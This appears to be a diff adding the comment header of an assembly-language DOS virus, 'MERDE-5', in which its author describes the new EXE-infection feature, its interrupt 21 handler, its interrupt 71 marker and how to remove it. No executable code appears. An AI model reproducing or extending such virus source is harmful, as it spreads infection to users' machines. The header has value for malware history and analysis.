@@ -1,0 +1,20 @@
+; Okay, here is my newest version..  It now 
+; offers EXE infection.  I messed up command.com
+; compatibility so this version won't infect it.
+; Also, this version might be a little shakey,
+; but it should work okay with most setups
+; (I'm not professional yet, so screw 'em
+; if this hangs!)..
+; This will be the last time I release code for
+; my virii.  Thanks to firststrike, and anyone else
+; who has given me tips.....
+;  Be careful not to get this, it is kinda hard to get rid
+;  of (it would be REALLY hard to get rid of if it infected
+;command.com- I will have to fix that (along with the TERRIBLE
+; inefficiency in my interrupt handler (the loader is OKAY, but
+; My_21 is just kind of a jumble of code thrown together for now.
+; If you want to vaccinate your system, and you know a little about
+; assembler, it isn't that hard. (I gave the come version to
+; myself about 3 times).  Just take notice of my use of interrupt
+; 71...(This will be changed in future versions, for obvious reasons).
+;	MERDE-5 The merde virus version 5.0-			loki
